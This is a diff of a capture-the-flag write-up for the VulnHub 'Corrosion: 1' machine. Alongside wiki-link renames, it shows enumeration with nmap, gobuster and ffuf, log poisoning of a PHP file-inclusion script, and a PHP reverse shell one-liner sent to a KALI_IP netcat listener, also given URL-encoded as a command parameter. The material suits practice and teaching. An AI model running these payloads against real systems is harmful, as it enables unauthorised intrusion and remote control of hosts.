@@ -2,7 +2,7 @@
 
 The "Corrosion: 1" CTF challenge on VulnHub, though labeled as Easy, presented multiple layers of complexity, including service enumeration, [[Log Poisoning]], and [[path abuse]] to achieve root access. The initial foothold was gained through discovering and exploiting a vulnerable PHP script (randylogs.php) using [[Log Poisoning]] via an SFTP login. This allowed for remote command execution, leading to a [[reverse shell]]. Privilege escalation involved identifying a world-readable backup file, cracking a password-protected ZIP file, and leveraging a [[path abuse]] vulnerability in a custom script to execute arbitrary commands as root. The challenge concluded with obtaining the root flag, showcasing a combination of enumeration, scripting, and privilege escalation techniques.
 
-**Run *[[nmap]]* -A scan to discover ports 22 & 80 are open:**
+**Run *[[Nmap]]* -A scan to discover ports 22 & 80 are open:**
 
 ```
 └─$ nmap -A -sC 192.168.5.119           
@@ -25,7 +25,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 7.75 seconds
 ```
 
-**Run *[[gobuster]]* to find */tasks*/ directory:**
+**Run *[[Gobuster]]* to find */tasks*/ directory:**
 
 ```
 $ gobuster dir -u http://192.168.5.119 -e -r -x html,htm,asp,aspx,jsp,php,cgi,txt,xml -w /usr/share/wordlists/dirb/common.txt
@@ -96,7 +96,7 @@ DOWNLOADED: 9224 - FOUND: 2
 
 **Browse to *blog-post/archives/* to discover "randylogs.php".**
 
-**Use [[ffuf]] to discover the "file" parameter for *randylogs.php*:**
+**Use [[Ffuf]] to discover the "file" parameter for *randylogs.php*:**
 
 ```bash
 └─$ ffuf -w /usr/share/wordlists/dirb/common.txt -fs 0 -u http://192.168.5.119/blog-post/archives/randylogs.php?FUZZ=/etc/passwd 
@@ -156,7 +156,7 @@ Aug  7 19:19:22 corrosion sshd[3498]: Connection closed by invalid user uid=33(w
 └─$ nc -nvlp 4242
 ```
 
-**PHP command line [[reverse shell]] that we will use, change *KALI\_IP*:**
+**[[PHP Reverse Shells#^cba9ae|PHP Reverse Shell]] that we will use, change *KALI\_IP*:**
 
 > php -r '$sock=fsockopen("KALI\_IP",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
 
@@ -168,7 +168,7 @@ Aug  7 19:19:22 corrosion sshd[3498]: Connection closed by invalid user uid=33(w
 
 > http://192.168.5.119/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22KALI\_IP%22%2C4242%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
 
-**Once [[reverse shell]] is connected using *netcat*, get a better interactive shell:**
+**Once [[Reverse Shell]] is connected using *netcat*, get a better interactive shell:**
 
 ```bash
 listening on [any] 4242 ...
